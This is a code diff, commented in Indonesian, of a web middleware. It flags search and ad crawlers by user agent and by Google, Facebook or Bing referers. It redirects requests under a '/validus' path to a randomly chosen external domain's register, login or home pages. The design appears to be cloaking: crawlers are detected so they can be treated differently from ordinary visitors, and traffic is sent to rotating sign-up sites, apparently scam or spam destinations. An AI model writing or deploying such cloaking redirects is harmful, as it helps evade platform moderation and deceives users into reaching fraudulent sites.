@@ -16,8 +16,6 @@ const TARGET_DOMAINS = [
 
 // USER AGENT BOT/CRAWLER
 const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
-
-// SUMBER MENCURIGAKAN (Referer)
 const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];
 
 
@@ -28,24 +26,16 @@ export default function middleware(request) {
     const referer = request.headers.get('referer')?.toLowerCase() || '';
 
     let isBot = false;
-
-    // A. Pengecekan Bot/Crawler
+    // Pengecekan Bot
     for (const bot of BOT_AGENTS) {
-        if (userAgent.includes(bot)) {
-            isBot = true;
-            break;
-        }
+        if (userAgent.includes(bot)) { isBot = true; break; }
     }
     for (const ref of SUSPICIOUS_REFERERS) {
-        if (referer.includes(ref)) {
-            isBot = true;
-            break;
-        }
+        if (referer.includes(ref)) { isBot = true; break; }
     }
 
-    // B. Pengecekan Path: Apakah dimulai dengan /validus/
+    // Pengecekan Path
     const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);
-
 
     // ===============================================
     // 3. EKSEKUSI
@@ -58,31 +48,32 @@ export default function middleware(request) {
         const randomIndex = Math.floor(Math.random() * TARGET_DOMAINS.length);
         const randomBaseDomain = TARGET_DOMAINS[randomIndex];
 
-        // 2. Ambil Sisa Path Setelah '/validus/'
+        // 2. Ambil Sisa Path TEPAT setelah '/validus'
         // Contoh: '/validus/daftar' -> '/daftar'
-        const remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); // Hasilnya: /daftar atau /home dll.
+        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length);
 
-        // 3. Gabungkan Domain Dasar + Sisa Path
-        // randomBaseDomain (misal: https://ventureidven.com) + remainingPath (misal: /daftar)
-        // Hasilnya: https://ventureidven.com/daftar
-        let finalRedirectUrl = randomBaseDomain + remainingPath;
-
-        // 4. Lakukan Penggantian (Path Mapping)
-        // Kita harus mengubah path: /daftar -> /index/user/register
-
-        if (finalRedirectUrl.endsWith('/daftar')) {
-            finalRedirectUrl = finalRedirectUrl.replace('/daftar', '/index/user/register');
-        } else if (finalRedirectUrl.endsWith('/home')) {
-            finalRedirectUrl = finalRedirectUrl.replace('/home', '/index/my/index');
-        } else if (finalRedirectUrl.endsWith('/login')) {
-            finalRedirectUrl = finalRedirectUrl.replace('/login', '/index/user/login');
-        } 
-        
-        // KONDISI KHUSUS: Jika hanya /validus/, kita arahkan ke root domain tujuan.
-        else if (finalRedirectUrl.endsWith('/validus/')) {
-            finalRedirectUrl = randomBaseDomain + '/';
+        // Pastikan remainingPath dimulai dengan '/' jika belum ada, untuk menjaga konsistensi.
+        if (remainingPath && !remainingPath.startsWith('/')) {
+            remainingPath = '/' + remainingPath;
         }
 
+        // 3. Tentukan Path Tujuan Sebenarnya (Mapping)
+        let targetPath = '';
+
+        if (remainingPath === 'daftar' || remainingPath === '/daftar') {
+            targetPath = '/index/user/register';
+        } else if (remainingPath === 'home' || remainingPath === '/home') {
+            targetPath = '/index/my/index';
+        } else if (remainingPath === 'login' || remainingPath === '/login') {
+            targetPath = '/index/user/login';
+        } 
+        // Jika hanya /validus/ atau path lain yang tidak terdaftar, arahkan ke root '/'
+        else {
+            targetPath = '/';
+        }
+
+        // 4. Gabungkan Domain Dasar + Path Tujuan
+        const finalRedirectUrl = randomBaseDomain + targetPath;
 
         // Lakukan Pengalihan 302
         return NextResponse.redirect(finalRedirectUrl, 302);
